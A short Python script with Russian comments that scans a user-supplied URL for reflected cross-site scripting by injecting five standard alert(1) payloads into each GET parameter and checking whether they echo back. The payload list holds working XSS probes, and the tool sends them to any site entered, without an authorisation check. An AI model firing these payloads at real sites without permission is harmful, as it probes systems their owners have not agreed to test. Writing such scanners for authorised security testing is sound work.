import requests
import time
import sys
import urllib.parse
from colorama import init, Fore, Style

# Инициализация colorama — ОБЯЗАТЕЛЬНО ДО ЛЮБОГО ИСПОЛЬЗОВАНИЯ ЦВЕТОВ
init()  # autoreset=True можно оставить, но добавим явно

def typewriter(text, delay=0.03):
    """Анимация печатания текста с поддержкой цветов"""
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay)
    print()  # новая строка в конце

def get_all_params(url):
    parsed = urllib.parse.urlparse(url)
    params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
    params = {k: v[0] if v else '' for k, v in params.items()}
    base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
    return base_url, params

def test_xss_payload(url, params, payload):
    test_params = params.copy()
    for key in test_params:
        test_params[key] = payload
        query = urllib.parse.urlencode(test_params)
        test_url = f"{url}?{query}"
        try:
            response = requests.get(test_url, timeout=10)
            if payload in response.text:
                return True, key
        except requests.RequestException:
            continue
    return False, None

def main():
    # ВСЕГДА сбрасываем стиль перед выводом
    typewriter(Fore.CYAN + "Введите URL для проверки на XSS:" + Style.RESET_ALL, delay=0.02)
    target_url = input().strip()

    if not target_url.startswith(('http://', 'https://')):
        target_url = 'https://' + target_url

    try:
        requests.get(target_url, timeout=10)
    except requests.RequestException:
        typewriter(Fore.RED + "❌ Ошибка: Не удалось подключиться к указанному URL." + Style.RESET_ALL)
        return

    base_url, params = get_all_params(target_url)

    if not params:
        typewriter(Fore.RED + "⚠️  В URL отсутствуют GET-параметры. Сканер работает только с параметрами в URL." + Style.RESET_ALL)
        return

    typewriter(Fore.GREEN + f"🔍 Найдены параметры: {', '.join(params.keys())}" + Style.RESET_ALL)
    typewriter(Fore.MAGENTA + "🚀 Начинаю проверку на XSS..." + Style.RESET_ALL)

    payloads = [
        "<script>alert(1)</script>",
        "'><script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "\" onfocus=alert(1) autofocus=\"",
        "<svg onload=alert(1)>"
    ]

    vulnerable = False
    for i, payload in enumerate(payloads, 1):
        typewriter(Fore.BLUE + f"  Проверка payload #{i}..." + Style.RESET_ALL, delay=0.01)
        found, param = test_xss_payload(base_url, params, payload)
        if found:
            typewriter(Fore.RED + f"  💥 Уязвимость найдена! Payload сработал в параметре: {param}" + Style.RESET_ALL)
            vulnerable = True
            break

    if not vulnerable:
        typewriter(Fore.GREEN + "✅ XSS-уязвимости не обнаружены (на базовом уровне)." + Style.RESET_ALL)
    else:
        typewriter(Fore.RED + "❗ Сайт может быть уязвим к XSS-атакам!" + Style.RESET_ALL)

if __name__ == "__main__":
    main()
